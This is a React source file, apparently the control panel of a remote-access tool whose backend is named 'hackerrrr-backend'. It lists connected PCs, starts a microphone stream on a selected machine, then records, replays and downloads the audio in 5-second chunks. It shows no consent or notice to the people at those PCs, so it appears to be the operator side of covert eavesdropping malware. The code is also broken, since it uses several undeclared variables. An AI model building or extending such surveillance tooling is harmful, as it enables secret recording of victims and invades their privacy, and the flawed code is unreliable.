import { useEffect, useState, useRef } from 'react'
import { Mic, Play, Square, Volume2, Download } from 'lucide-react'
import { getPCs, startMicrophoneStream, stopStream, getStreamStatus } from '../services/api'
import AgoraRTC from 'agora-rtc-sdk-ng'

// Get API URL from environment or construct from current location
let API_BASE_URL = import.meta.env.VITE_API_URL
if (!API_BASE_URL && import.meta.env.PROD) {
  const hostname = window.location.hostname
  if (hostname.includes('onrender.com')) {
    const parts = hostname.split('.')
    if (parts[0] === 'hackerrrr-frontend') {
      API_BASE_URL = `https://hackerrrr-backend.${parts.slice(1).join('.')}`
    } else {
      API_BASE_URL = ''
    }
  } else {
    API_BASE_URL = ''
  }
} else if (!API_BASE_URL) {
  API_BASE_URL = 'http://localhost:8000'
}

API_BASE_URL = API_BASE_URL.replace(/\/$/, '')

const Microphone = () => {
  const [pcs, setPCs] = useState([])
  const [selectedPC, setSelectedPC] = useState(null)
  const [streamStatus, setStreamStatus] = useState(null)
  const [loading, setLoading] = useState(false)
  const [connectionState, setConnectionState] = useState('disconnected')
  const [isPlaying, setIsPlaying] = useState(false)
  const [currentChunk, setCurrentChunk] = useState(null)

  const audioRef = useRef(null)
  const clientRef = useRef(null)
  const remoteTrackRef = useRef(null)
  const audioContextRef = useRef(null)
  const mediaRecorderRef = useRef(null)
  const chunkIntervalRef = useRef(null)
  const chunkCounterRef = useRef(0)
  const audioChunksRef = useRef([])

  useEffect(() => {
    loadPCs()
    const interval = setInterval(loadPCs, 3000)
    return () => {
      clearInterval(interval)
      cleanupAgora()
    }
  }, [])

  useEffect(() => {
    if (selectedPC) {
      checkStreamStatus()
      const interval = setInterval(checkStreamStatus, 2000)
      return () => clearInterval(interval)
    } else {
      cleanupAgora()
    }
  }, [selectedPC])

  useEffect(() => {
    if (streamStatus?.has_active_stream && streamStatus?.stream_type === 'microphone' && selectedPC) {
      if (connectionState === 'disconnected' && !retryBlockedRef.current) {
        console.log('[Agora] Stream detected as active, connecting...')
        connectToStream(selectedPC)
      }
    } else if (!streamStatus?.has_active_stream) {
      cleanupAgora()
      retryBlockedRef.current = false
      setErrorMessage(null)
    }
  }, [streamStatus, selectedPC, connectionState])

  const cleanupAgora = async () => {
    try {
      if (chunkIntervalRef.current) {
        clearInterval(chunkIntervalRef.current)
        chunkIntervalRef.current = null
      }
      if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
        try {
          mediaRecorderRef.current.stop()
        } catch (e) {
          // Recorder may already be stopped
        }
        mediaRecorderRef.current = null
      }
      if (remoteTrackRef.current) {
        try {
          remoteTrackRef.current.stop()
        } catch (e) {
          // Track may already be stopped
        }
        remoteTrackRef.current = null
      }
      if (clientRef.current) {
        try {
          await clientRef.current.leave()
          await clientRef.current.release()
        } catch (e) {
          // Client may already be released
        }
        clientRef.current = null
      }
      if (audioRef.current) {
        audioRef.current.srcObject = null
      }
      setConnectionState('disconnected')
      setIsPlaying(false)
    } catch (error) {
      console.error('[Agora] Error during cleanup:', error)
    }
  }

  const loadPCs = async () => {
    try {
      const data = await getPCs(true)
      setPCs(data.pcs || [])
    } catch (error) {
      console.error('Error loading PCs:', error)
    }
  }

  const checkStreamStatus = async () => {
    if (!selectedPC) return
    try {
      const status = await getStreamStatus(selectedPC)
      setStreamStatus(status)
    } catch (error) {
      console.error('Error checking stream status:', error)
    }
  }

  const connectToStream = async (pcId) => {
    if (clientRef.current) {
      console.log('[Agora] Already connected, skipping...')
      return
    }

    try {
      setConnectionState('connecting')

      // Get subscriber token from backend
      const response = await fetch(`${API_BASE_URL}/api/streaming/${pcId}/token?stream_type=microphone&uid=0`)
      if (!response.ok) {
        throw new Error('Failed to get Agora token')
      }
      const data = await response.json()
      const { channel_name, token, uid, app_id } = data.agora

      console.log('[Agora] Connecting to channel:', channel_name)

      // Create Agora client
      const client = AgoraRTC.createClient({ mode: 'rtc', codec: 'vp8' })
      clientRef.current = client

      // Set up event handlers
      client.on('user-published', async (user, mediaType) => {
        console.log('[Agora] User published:', user.uid, mediaType)
        if (mediaType === 'audio') {
          await client.subscribe(user, mediaType)
          const remoteAudioTrack = user.audioTrack
          if (remoteAudioTrack && audioRef.current) {
            remoteTrackRef.current = remoteAudioTrack
            remoteAudioTrack.play()
            setConnectionState('connected')
            console.log('[Agora] ✅ Audio track subscribed and playing')

            // Set up audio recording for chunks
            setupAudioRecording(remoteAudioTrack)
          }
        }
      })

      client.on('user-unpublished', async (user, mediaType) => {
        console.log('[Agora] User unpublished:', user.uid, mediaType)
        try {
          if (mediaType === 'audio') {
            const remoteAudioTrack = user.audioTrack
            if (remoteAudioTrack) {
              remoteAudioTrack.stop()
            }
            if (audioRef.current) {
              audioRef.current.srcObject = null
            }
            setConnectionState('disconnected')
            setIsPlaying(false)
          }
        } catch (error) {
          console.error('[Agora] Error handling user-unpublished:', error)
        }
      })

      client.on('connection-state-change', (curState, revState) => {
        console.log('[Agora] Connection state changed:', curState, revState)
        if (curState === 'CONNECTED') {
          setConnectionState('connected')
        } else if (curState === 'DISCONNECTED') {
          setConnectionState('disconnected')
        }
      })

      // Join channel
      await client.join(app_id, channel_name, token, uid)
      console.log('[Agora] ✅ Joined channel successfully')
      setErrorMessage(null)
      retryBlockedRef.current = false

    } catch (error) {
      console.error('[Agora] Error connecting to stream:', error)
      const errorMsg = error.message || error.toString()
      
      // Check for invalid App ID error
      if (errorMsg.includes('invalid vendor key') || errorMsg.includes('can not find appid') || errorMsg.includes('CAN_NOT_GET_GATEWAY_SERVER')) {
        setErrorMessage('Invalid Agora App ID. Please check your Agora credentials in the backend configuration.')
        retryBlockedRef.current = true // Block retries
        setConnectionState('error')
        await cleanupAgora()
        return
      }
      
      setConnectionState('error')
      setErrorMessage('Failed to connect to Agora stream. Please try again.')
      await cleanupAgora()
    }
  }

  const setupAudioRecording = (audioTrack) => {
    try {
      // Create audio context for recording
      const audioContext = new (window.AudioContext || window.webkitAudioContext)()
      audioContextRef.current = audioContext

      // Get media stream from audio track
      const stream = new MediaStream()
      stream.addTrack(audioTrack.getMediaStreamTrack())

      // Create media recorder for 5-second chunks
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'audio/webm;codecs=opus'
      })
      mediaRecorderRef.current = mediaRecorder

      const chunks = []
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          chunks.push(event.data)
        }
      }

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'audio/webm' })
        const url = URL.createObjectURL(blob)
        const timestamp = new Date().toISOString()
        const chunkData = {
          id: chunkCounterRef.current++,
          url,
          blob,
          timestamp,
          size: blob.size
        }
        audioChunksRef.current.push(chunkData)
        setCurrentChunk(chunkData)
        chunks.length = 0
      }

      // Start recording and create 5-second chunks
      mediaRecorder.start()
      chunkIntervalRef.current = setInterval(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop()
          mediaRecorder.start()
        }
      }, 5000)

      console.log('[Agora] Audio recording setup complete')
    } catch (error) {
      console.error('[Agora] Error setting up audio recording:', error)
    }
  }

  const handleStartStream = async () => {
    if (!selectedPC) {
      alert('Please select a PC')
      return
    }
    setLoading(true)
    setErrorMessage(null)
    retryBlockedRef.current = false
    try {
      await startMicrophoneStream(selectedPC)
      setTimeout(async () => {
        await checkStreamStatus()
      }, 1000)
    } catch (error) {
      const errorMsg = error.response?.data?.detail || error.message
      setErrorMessage('Error starting microphone stream: ' + errorMsg)
      alert('Error starting microphone stream: ' + errorMsg)
    } finally {
      setLoading(false)
    }
  }

  const handleStopStream = async () => {
    if (!selectedPC) return
    setLoading(true)
    setErrorMessage(null)
    retryBlockedRef.current = false
    try {
      await stopStream(selectedPC)
      await cleanupAgora()
      await checkStreamStatus()
    } catch (error) {
      alert('Error stopping stream: ' + (error.response?.data?.detail || error.message))
    } finally {
      setLoading(false)
    }
  }

  const playChunk = (chunk) => {
    if (audioRef.current) {
      audioRef.current.src = chunk.url
      audioRef.current.play()
      setIsPlaying(true)
      audioRef.current.onended = () => setIsPlaying(false)
    }
  }

  const downloadChunk = (chunk) => {
    const a = document.createElement('a')
    a.href = chunk.url
    a.download = `audio_chunk_${chunk.id}_${chunk.timestamp}.webm`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
  }

  return (
    <div className="p-6">
      <div className="mb-6">
        <h1 className="text-3xl font-bold flex items-center gap-2 text-green-500">
          <Mic className="w-8 h-8" />
          Microphone Streaming
        </h1>
        <p className="text-green-400 mt-2">Listen to PC microphone in real-time using Agora (5-second audio chunks)</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* PC Selection */}
        <div className="lg:col-span-1">
          <div className="bg-black border border-green-500 rounded-lg shadow p-4">
            <h2 className="text-xl font-semibold mb-4 text-green-500">Select PC</h2>
            <div className="space-y-2">
              {pcs.length === 0 ? (
                <p className="text-green-400">No connected PCs</p>
              ) : (
                pcs.map((pc) => (
                  <button
                    key={pc.pc_id}
                    onClick={() => setSelectedPC(pc.pc_id)}
                    className={`w-full text-left p-3 rounded-lg transition-colors ${
                      selectedPC === pc.pc_id
                        ? 'bg-green-500 text-black'
                        : 'bg-gray-900 border border-green-500/30 hover:border-green-500 text-green-400'
                    }`}
                  >
                    <div className="font-semibold">{pc.pc_id}</div>
                    <div className="text-sm opacity-75">{pc.hostname || 'Unknown'}</div>
                  </button>
                ))
              )}
            </div>

            {selectedPC && (
              <div className="mt-4 space-y-2">
                <button
                  onClick={handleStartStream}
                  disabled={loading || streamStatus?.has_active_stream}
                  className="w-full bg-green-500 text-black px-4 py-2 rounded-lg hover:bg-green-600 disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed flex items-center justify-center gap-2 font-semibold"
                >
                  <Play className="w-4 h-4" />
                  {loading ? 'Starting...' : 'Start Microphone Stream'}
                </button>
                <button
                  onClick={handleStopStream}
                  disabled={loading || !streamStatus?.has_active_stream}
                  className="w-full bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed flex items-center justify-center gap-2 font-semibold"
                >
                  <Square className="w-4 h-4" />
                  Stop Stream
                </button>
              </div>
            )}

            {streamStatus && (
              <div className="mt-4 p-3 bg-gray-900 border border-green-500/30 rounded-lg">
                <div className="text-sm">
                  <div className="flex justify-between">
                    <span className="font-semibold text-green-400">Status:</span>
                    <span className={streamStatus.has_active_stream ? 'text-green-500' : 'text-green-400'}>
                      {streamStatus.has_active_stream ? 'Active' : 'Inactive'}
                    </span>
                  </div>
                  {streamStatus.has_active_stream && (
                    <div className="flex justify-between mt-1">
                      <span className="font-semibold text-green-400">Type:</span>
                      <span className="text-green-400 capitalize">{streamStatus.stream_type}</span>
                    </div>
                  )}
                  <div className="flex justify-between mt-1">
                    <span className="font-semibold text-green-400">Connection:</span>
                    <span className={connectionState === 'connected' ? 'text-green-500' : 'text-green-400'}>
                      {connectionState}
                    </span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Audio Display and Chunks */}
        <div className="lg:col-span-2">
          <div className="bg-black border border-green-500 rounded-lg shadow p-4 mb-4">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-semibold text-green-500">Audio Stream</h2>
              {connectionState === 'connected' && (
                <div className="flex items-center gap-2 text-green-500">
                  <Volume2 className="w-5 h-5" />
                  <span>Live</span>
                </div>
              )}
            </div>
            {connectionState === 'connected' ? (
              <div className="text-center py-8 bg-gray-900 border border-green-500/30 rounded-lg">
                <Volume2 className="w-16 h-16 mx-auto mb-4 text-green-500" />
                <p className="text-green-400">Audio stream is active</p>
                <p className="text-sm text-green-400/70 mt-2">Audio chunks are being recorded below</p>
              </div>
            ) : (
              <div className="text-center py-8 bg-gray-900 border border-green-500/30 rounded-lg">
                {connectionState === 'connecting' ? (
                  <>
                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-500 mx-auto mb-4"></div>
                    <p className="text-green-400">Connecting to stream...</p>
                  </>
                ) : connectionState === 'error' && errorMessage ? (
                  <>
                    <div className="text-red-500 mb-4 text-4xl">⚠️</div>
                    <p className="text-red-500 font-semibold mb-2">Connection Error</p>
                    <p className="text-sm text-center max-w-md text-green-400">{errorMessage}</p>
                    {errorMessage.includes('Invalid Agora App ID') && (
                      <p className="text-xs mt-4 text-green-400/70 text-center max-w-md">
                        Please verify your Agora App ID and Certificate in the backend environment variables.
                      </p>
                    )}
                  </>
                ) : (
                  <>
                    <Mic className="w-16 h-16 mx-auto mb-4 text-green-400 opacity-50" />
                    <p className="text-green-400">No stream active</p>
                    <p className="text-sm mt-2 text-green-400/70">Select a PC and start the microphone stream</p>
                  </>
                )}
              </div>
            )}
            <audio ref={audioRef} hidden />
          </div>

          {/* Audio Chunks */}
          <div className="bg-black border border-green-500 rounded-lg shadow p-4">
            <h2 className="text-xl font-semibold mb-4 text-green-500">Audio Chunks (5-second intervals)</h2>
            {audioChunksRef.current.length === 0 ? (
              <p className="text-green-400 text-center py-8">No audio chunks recorded yet</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {audioChunksRef.current.map((chunk) => (
                  <div
                    key={chunk.id}
                    className="flex items-center justify-between p-3 bg-gray-900 border border-green-500/30 rounded-lg hover:border-green-500"
                  >
                    <div className="flex-1">
                      <div className="font-semibold text-green-400">Chunk #{chunk.id}</div>
                      <div className="text-sm text-green-400/70">
                        {new Date(chunk.timestamp).toLocaleTimeString()} • {(chunk.size / 1024).toFixed(2)} KB
                      </div>
                    </div>
                    <div className="flex gap-2">
                      <button
                        onClick={() => playChunk(chunk)}
                        disabled={isPlaying}
                        className="px-3 py-1 bg-green-500 text-black rounded hover:bg-green-600 disabled:bg-gray-700 disabled:text-gray-500"
                      >
                        <Play className="w-4 h-4" />
                      </button>
                      <button
                        onClick={() => downloadChunk(chunk)}
                        className="px-3 py-1 bg-green-500 text-black rounded hover:bg-green-600"
                      >
                        <Download className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Microphone
